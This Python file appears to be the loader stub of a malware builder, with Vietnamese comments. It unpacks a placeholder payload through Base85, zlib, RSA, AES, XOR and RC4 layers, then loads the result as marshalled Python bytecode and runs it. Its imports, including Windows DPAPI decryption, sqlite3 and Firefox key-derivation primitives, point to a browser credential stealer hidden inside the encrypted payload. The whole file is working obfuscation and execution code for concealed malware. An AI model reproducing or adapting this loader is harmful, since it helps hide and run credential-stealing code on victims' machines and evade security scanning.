import os, json, base64, sqlite3, shutil, requests, glob, re, zipfile, io, datetime, hmac, subprocess, zlib
from websocket import create_connection
from base64 import b64decode
from hashlib import sha1, pbkdf2_hmac
from pathlib import Path
from pyasn1.codec.der.decoder import decode
from Crypto.Cipher import AES, DES3, PKCS1_OAEP
from Crypto.PublicKey import RSA
from win32crypt import CryptUnprotectData
from ctypes import windll, byref, create_unicode_buffer, pointer, WINFUNCTYPE
from ctypes.wintypes import DWORD, WCHAR, UINT

def decompress(code_bytes: bytes) -> bytes:
    return zlib.decompress(code_bytes)
def rc4(data, key):
    S = list(range(256))
    j = 0
    out = []
    # Khởi tạo
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    # Sinh key stream và XOR với data
    for char in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(char ^ S[(S[i] + S[j]) % 256])
    return bytes(out)
def aes_decrypt(data, key):
    nonce = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_EAX, nonce=nonce)
    return cipher.decrypt(ciphertext)
def xor(data, key):
    return bytes([b ^ key[i % len(key)] for i, b in enumerate(data)])

def rsa_decrypt(data, private_key):
    rsa_cipher = PKCS1_OAEP.new(RSA.import_key(private_key))
    return rsa_cipher.decrypt(data)
def hybrid_decrypt(base85_encoded_data, rsa_private_key):
    # 1. Giải mã từ Base85
    compressed_data = base64.b85decode(base85_encoded_data)
    encrypted_data = decompress(compressed_data)
    # Tách khóa RSA và dữ liệu đã mã hóa
    rsa_encrypted_key = encrypted_data[:256]  # Độ dài RSA khóa 2048 là 256 byte
    aes_encrypted = encrypted_data[256:]
    
    # 2. Giải mã khóa đối xứng bằng RSA
    combined_key = rsa_decrypt(rsa_encrypted_key, rsa_private_key)
    rc4_key = combined_key[:16]
    xor_key = combined_key[16:32]
    aes_key = combined_key[32:48]
    
    # 3. Giải mã bằng AES
    xor_encrypted = aes_decrypt(aes_encrypted, aes_key)
    
    # 4. Giải mã bằng XOR
    rc4_encrypted = xor(xor_encrypted, xor_key)
    
    # 5. Giải mã bằng RC4
    decrypted_data = rc4(rc4_encrypted, rc4_key)
    
    return decrypted_data

private_key = base64.b64decode("%encrypted_key%")
def runner(byte_code_data):
    import marshal, types
    code_object = marshal.loads(byte_code_data)
    exceute_func = types.FunctionType(code_object, globals())
    exceute_func()
code = hybrid_decrypt("%encrypted_data%", private_key)

runner(code)